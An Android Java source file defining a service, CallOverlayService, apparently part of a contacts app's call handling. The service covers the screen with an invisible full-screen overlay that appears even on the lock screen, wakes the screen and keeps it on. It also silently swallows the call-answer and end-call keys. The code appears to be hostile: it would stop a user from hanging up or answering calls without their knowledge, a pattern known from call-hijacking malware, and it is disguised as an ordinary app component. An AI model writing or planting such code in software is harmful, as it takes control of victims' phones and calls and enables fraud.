package com.example.contacts.call;

import android.app.Service;
import android.graphics.Color;
import android.os.IBinder;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;

public class CallOverlayService extends Service {
    private WindowManager wm; private View view;
    public void onCreate(){super.onCreate();}
    public int onStartCommand(android.content.Intent i,int flags,int id){
        if(view!=null)return START_STICKY;
        wm=(WindowManager)getSystemService(WINDOW_SERVICE);
        TextView v=new TextView(this);
        v.setTextColor(Color.TRANSPARENT);v.setBackgroundColor(Color.TRANSPARENT);v.setFocusable(true);v.setFocusableInTouchMode(true);v.setGravity(Gravity.CENTER);v.requestFocus();
        v.setOnKeyListener(new View.OnKeyListener(){public boolean onKey(View x,int key,KeyEvent e){
            return e.getAction()==KeyEvent.ACTION_DOWN&&(key==KeyEvent.KEYCODE_ENDCALL||key==KeyEvent.KEYCODE_CALL);
        }});
        int type=WindowManager.LayoutParams.TYPE_PHONE;
        WindowManager.LayoutParams lp=new WindowManager.LayoutParams(-1,-1,type,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL|WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN|
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                android.graphics.PixelFormat.TRANSLUCENT);
        try{wm.addView(v,lp);view=v;}catch(Exception ignored){view=null;}
        return START_STICKY;
    }
    public void onDestroy(){if(wm!=null&&view!=null)try{wm.removeView(view);}catch(Exception ignored){}view=null;super.onDestroy();}
    public IBinder onBind(android.content.Intent i){return null;}
}
